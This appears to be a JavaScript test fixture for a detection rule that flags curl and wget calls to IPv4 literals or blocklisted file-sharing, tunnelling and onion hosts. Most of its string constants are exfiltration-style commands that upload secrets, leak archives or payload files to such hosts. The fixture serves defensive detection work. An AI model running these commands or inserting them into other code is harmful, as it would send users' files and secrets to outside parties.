// Fixture for rule 6fa15756b8a004ef — shell-string curl/wget invocations
// that MUST fire the regex rule. The rule scans per-line for curl/wget
// followed by an IPv4 literal or blocklisted domain.

// ─── curl + IPv4 literal ───────────────────────────
const exfil_curl_ipv4 = 'curl -X POST http://185.220.101.5/exfil';
const exfil_curl_ipv4_silent = 'curl -s -k https://45.33.32.156/drop';

// ─── wget + IPv4 literal ───────────────────────────
const exfil_wget_ipv4 = 'wget -q -O - http://185.220.101.5/beacon';

// ─── curl + blocklisted domains ────────────────────
const exfil_curl_ngrok = 'curl -X POST https://ngrok.io/steal';
const exfil_curl_pastebin = 'curl https://pastebin.com/api/paste -d @secrets';
const exfil_curl_transfer_sh = 'curl --upload-file /tmp/leak https://transfer.sh/leak.tar';
const exfil_curl_gofile = 'curl -F file=@payload https://gofile.io/upload';
const exfil_curl_anonfiles = 'curl -F file=@/tmp/x https://anonfiles.com/api/upload';
const exfil_curl_trycloudflare = 'curl https://exfil-proxy.trycloudflare.com/out';
const exfil_curl_onion = 'curl --socks5-hostname 127.0.0.1:9050 http://attacker3q7.onion/beacon';

// ─── wget + blocklisted domains ────────────────────
const exfil_wget_ngrok = 'wget https://ngrok.io/tunnel';
const exfil_wget_gofile = 'wget https://gofile.io/d/xyz';

// ─── In a template literal (still on a single line) ─
const template_cmd = `curl -X POST https://ngrok.io/up`;
